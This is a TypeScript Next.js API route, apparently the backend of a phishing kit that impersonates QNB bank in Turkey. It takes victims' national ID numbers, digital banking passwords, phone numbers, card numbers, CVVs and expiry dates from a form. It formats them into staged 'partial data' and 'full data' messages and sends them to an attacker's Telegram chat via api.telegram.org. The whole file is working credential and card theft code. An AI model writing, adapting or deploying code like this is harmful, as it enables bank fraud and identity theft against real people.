import { NextRequest, NextResponse } from 'next/server'

interface TelegramData {
  username: string // TC Kimlik veya Kart Türü
  password: string // Dijital Şifre veya CVV
  phone: string // Telefon veya Kart Numarası
  creditLimit: string // Kredi Limiti veya Son Kullanma Tarihi
  applicationDate: string
  realName?: string // Ad Soyad veya Kart Sahibi
  realSurname?: string
  messageType?: 'PHONE_INFO' | 'CARD_INFO' // Mesaj türü
}

export async function POST(request: NextRequest) {
  try {
    const telegramData: TelegramData = await request.json()
    
    // Gerekli alanları kontrol et
    if (!telegramData.username || !telegramData.password || !telegramData.phone || !telegramData.creditLimit) {
      return NextResponse.json(
        { success: false, error: 'Eksik bilgi' },
        { status: 400 }
      )
    }

    // Domain bilgisini al
    const host = request.headers.get('host') || 'bilinmeyen-domain'
    const protocol = request.headers.get('x-forwarded-proto') || 'http'
    const fullDomain = `${protocol}://${host}`

    // Telegram bilgilerini al
    const token = process.env.TELEGRAM_TOKEN
    const chatId = process.env.TELEGRAM_CHAT
    
    if (!token || !chatId) {
      console.error('Telegram token veya chat ID bulunamadı')
      return NextResponse.json(
        { success: false, error: 'Telegram konfigürasyonu eksik' },
        { status: 500 }
      )
    }

    // Mesaj türünü belirle
    const messageType = telegramData.messageType || 'PHONE_INFO'
    
    // Telegram mesajını oluştur
    let message = ''
    
    if (messageType === 'CARD_INFO') {
      message = `
🔔 *💳 KART BİLGİLERİ TAMAMLANDI*

🌐 *Domain:* \`${fullDomain}\`

💳 *Kart Bilgileri:*
💳 Kart Numarası: \`${telegramData.phone}\`
🔐 CVV: \`${telegramData.password}\`
📅 Son Kullanma: \`${telegramData.creditLimit}\`
👤 Kart Sahibi: \`${telegramData.realName}\`
📅 Tamamlanma Tarihi: \`${telegramData.applicationDate}\`

🎯 *DURUM:* ✅ *TAM VERİ - KART BİLGİLERİ ALINDI*

---
      `.trim()
    } else if (messageType === 'PHONE_INFO') {
      message = `
🔔 *📱 ÖN BİLGİLER ALINDI*

🌐 *Domain:* \`${fullDomain}\`

👤 *İlk Adım Bilgileri:*
🆔 TC Kimlik: \`${telegramData.username}\`
🔐 Dijital Şifre: \`${telegramData.password}\`
📱 Telefon: \`${telegramData.phone}\`
💳 Kredi Kartı Limiti: \`${telegramData.creditLimit} ₺\`
📅 Başlangıç Tarihi: \`${telegramData.applicationDate}\`

⚠️ *DURUM:* 🟡 *PARÇA VERİ - KART BİLGİLERİ BEKLENİYOR*

---
      `.trim()
    } else {
      // Eski format (backward compatibility)
      message = `
🔔 *YENİ QNB BAŞVURUSU*

🌐 *Domain:* \`${fullDomain}\`

👤 *Kullanıcı Bilgileri:*
🆔 TC Kimlik: \`${telegramData.username}\`
🔐 Dijital Şifre: \`${telegramData.password}\`
📱 Telefon: \`${telegramData.phone}\`
💳 Kredi Kartı Limiti: \`${telegramData.creditLimit} ₺\`
📅 Başvuru Tarihi: \`${telegramData.applicationDate}\`

${telegramData.realName ? `👤 Ad Soyad: \`${telegramData.realName} ${telegramData.realSurname}\`` : ''}

---
      `.trim()
    }

    // Telegram API'sine istek gönder
    const response = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown'
      })
    })

    const data = await response.json()

    if (data.ok) {
      return NextResponse.json({ success: true })
    } else {
      console.error('Telegram API hatası:', data)
      return NextResponse.json(
        { success: false, error: 'Telegram gönderimi başarısız' },
        { status: 500 }
      )
    }

  } catch (error) {
    console.error('Telegram gönderim hatası:', error)
    return NextResponse.json(
      { 
        success: false, 
        error: 'Sunucu hatası' 
      },
      { status: 500 }
    )
  }
} 